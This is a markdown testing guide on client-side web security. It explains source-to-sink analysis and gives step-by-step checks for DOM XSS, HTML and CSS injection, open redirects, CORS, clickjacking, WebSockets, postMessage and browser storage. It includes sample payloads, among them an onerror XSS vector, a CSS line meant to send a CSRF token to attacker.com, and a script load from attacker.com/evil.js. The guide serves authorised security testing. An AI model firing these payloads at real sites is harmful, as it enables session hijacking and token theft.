# Client-Side-Security

To understand client-side security, you have to think like a data-tracker. In the browser, "Source-to-Sink" is the path that data travels. If that path isn't "cleaned" (sanitized or encoded) along the way, the application is vulnerable.

---

## a. The Core Concept: Source, Sink, and Result
This is the "Holy Trinity" of client-side vulnerability analysis.

### The Source (Where data comes from)
A **Source** is a JavaScript property that can be controlled by an attacker.
* **`location.search`**: Everything after the `?` in a URL (e.g., `?id=123`).
* **`location.hash`**: Everything after the `#` in a URL (e.g., `#section1`). This is often safer from server-side filters because hashes are usually not sent to the server.
* **`document.cookie`**: Data stored in the user's cookies.
* **`window.name`**: A persistent property of a browser window/tab.

### The Sink (Where it executes)
A **Sink** is a function or DOM object that can execute or render the data it receives.
* **Execution Sinks:** `eval()`, `setTimeout()`, `setInterval()`. These take a string and run it as JavaScript code.
* **Rendering Sinks:** `.innerHTML`, `document.write()`. These take a string and render it as HTML. If that string contains `<script>`, the browser will run it.

### The Result (The Impact)
The **Result** is the proof of the exploit. In a "Clean" test, the result is usually an `alert(document.domain)` or a redirect, proving that the attacker now has control over the user's session in that specific origin.



---

## b. Deep Dive: The Dangerous Sinks

### `.innerHTML`
* **What it does:** It sets or gets the HTML markup contained within an element.
* **Security Risk:** If you assign `element.innerHTML = user_input`, and `user_input` is `<img src=x onerror=alert(1)>`, the browser creates the image element, fails to find `src=x`, and triggers the `onerror` JavaScript.
* **The "Clean" Fix:** Use `.textContent` instead. It treats everything as raw text and will not render tags.

### `document.write()`
* **What it does:** It writes a string of text to a document stream opened by `document.open()`.
* **Security Risk:** It is an older method that allows direct injection of HTML tags into the page while it's loading. It is highly susceptible to "Breaking out" of existing HTML tags.

### `eval()`
* **What it does:** It evaluates a string as JavaScript code.
* **Security Risk:** This is the most dangerous sink. If an attacker can get their input into an `eval()` call, they have full execution rights. **Never use `eval()` with user-controlled data.**

---
To test these vulnerabilities effectively, you must focus on how the browser's Document Object Model (DOM) handles data. In client-side security, the vulnerability isn't usually in the database, but in the **JavaScript logic** running in the user's browser.

Here is the professional, step-by-step "clean" procedure for each, focusing on the **Source** (where input starts), the **Sink** (where it executes), and the **Result** (the proof of impact).

---

### 1. DOM-based XSS & JavaScript Execution
**Background:** An attacker-controlled **Source** (like the URL hash) reaches an execution **Sink** (like `eval()` or `.innerHTML`) without being sanitized.
* **Step 1 (Find Sinks):** In DevTools **Sources**, search (`Ctrl+Shift+F`) for: `.innerHTML`, `document.write(`, `eval(`, `setTimeout(`, or `jQuery(`.
* **Step 2 (Trace to Source):** Identify if these sinks use `location.hash`, `location.search`, or `document.referrer`.
* **Step 3 (The Payload):** Visit `https://example.com/#<img src=x onerror=alert(document.domain)>`.
* **Clean Result:** If an alert box appears, it’s a **FAIL**.


### 2. HTML Injection
**Background:** Similar to XSS, but focuses on injecting non-scripting tags to deface the site or create fake login forms.
* **Step 1:** Find any input that reflects on the page (e.g., "Results for [Input]").
* **Step 2 (The Payload):** Input `<h1>Test</h1>` or `</a><a href='http://evil.com'>Click Here</a>`.
* **Clean Result:** Inspect the element (F12). If your tags appear as real HTML elements rather than literal text (e.g., `&lt;h1&gt;`), it’s a **FAIL**.

### 3. Client-Side URL Redirect
**Background:** The application uses a URL parameter to decide where to send the user after an action.
* **Step 1:** Look for parameters like `?url=`, `?next=`, or `?redirect=`.
* **Step 2 (The Payload):** Change the value to `https://google.com` or `//google.com`.
* **Step 3 (Check JS):** Search for `window.location.href = ` or `location.replace(` in the code.
* **Clean Result:** If the browser leaves your domain and navigates to Google, it’s a **FAIL**.

### 4. CSS Injection
**Background:** Injecting `<style>` tags or `style` attributes to change the UI or steal data via background-image requests.
* **Step 1:** Find a reflection point and inject `<style>body{background:red;}</style>`.
* **Step 2:** Try to steal data: `<style>input[name="csrf"]{background:url('http://attacker.com/log?token=' + value);}</style>`.
* **Clean Result:** If the page background changes or the Network tab shows a request to the attacker's URL, it’s a **FAIL**.

### 5. Client-Side Resource Manipulation
**Background:** The app builds a path to a resource (like a script or image) using user input.
* **Step 1:** Look for code like `var script = document.createElement('script'); script.src = '/js/' + userFolder + '/app.js';`.
* **Step 2 (The Payload):** Use Path Traversal: `?userFolder=../../attacker.com/evil.js%23`.
* **Clean Result:** Check the **Network** tab. If the browser attempts to load a script from a location you controlled, it’s a **FAIL**.

### 6. Cross-Origin Resource Sharing (CORS)
**Background:** Testing if the server incorrectly trusts other domains to read sensitive data.
* **Step 1:** In Burp Repeater, add the header `Origin: https://evil.com` to a sensitive API request.
* **Step 2 (The Check):** Look for `Access-Control-Allow-Origin: https://evil.com` AND `Access-Control-Allow-Credentials: true`.
* **Clean Result:** If both headers are present, a malicious site can steal the user's private data via AJAX. This is a **FAIL**.

### 7. Clickjacking
**Background:** Tricking a user into clicking a hidden button on your site by overlaying the target site in an invisible iframe.
* **Step 1:** Create a local `test.html` file: `<iframe src="https://target.com" style="opacity:0.5; width:1000px; height:1000px;"></iframe>`.
* **Step 2:** Open it in a browser.
* **Clean Result:** If the site loads, it’s a **FAIL**. If you see "Refused to display... X-Frame-Options: SAMEORIGIN", it is a **PASS**.


### 8. WebSockets
**Background:** Testing for "Cross-Site WebSocket Hijacking" (CSWSH) or lack of input validation.
* **Step 1:** Open DevTools **Network > WS** tab and refresh.
* **Step 2:** In Burp, use the **WebSockets history** tab to intercept a message.
* **Step 3:** Change the message content (e.g., change `{"user":"me"}` to `{"user":"admin"}`).
* **Clean Result:** If the server processes the spoofed message, it is a **FAIL**.

### 9. Web Messaging (postMessage)
**Background:** Windows/Iframes communicating with each other. Vulnerable if they don't check who is talking.
* **Step 1:** Search code for `window.addEventListener("message", ...)`.
* **Step 2:** Check if the code validates `event.origin`.
* **Step 3 (The Payload):** From the Console: `window.postMessage({"action":"delete_account"}, "*")`.
* **Clean Result:** If the application performs the action without verifying the sender, it is a **FAIL**.

### 10. Local Storage / Session Storage
**Background:** Storing sensitive data in the browser where it can be modified or stolen.
* **Step 1:** Go to DevTools **Application > Local Storage**.
* **Step 2:** Look for PII (names, emails) or authorization tokens.
* **Step 3:** Change a value (e.g., `is_admin: false` to `true`) and refresh.
* **Clean Result:** If the UI changes or grants new privileges, it is a **FAIL**.


### 11. Cross-Site Flashing
**Background:** (Legacy) Testing if a Flash (.swf) file can be controlled via URL parameters to execute JS.
* **Note:** Modern browsers have disabled Flash. If you find a `.swf` file, it is automatically a **Security Risk** due to the lack of modern browser support and security patches.

---

### Summary Checklist for a "Clean" Audit
1.  **Source:** Is the data coming from the user (URL, Storage, or `postMessage`)?
2.  **Sink:** Is it going into a function that executes or renders it (`eval`, `innerHTML`, `location.href`)?
3.  **Sanitization:** Does the code use a library like **DOMPurify** or `.textContent` to neutralize the input? If not, it is likely vulnerable.
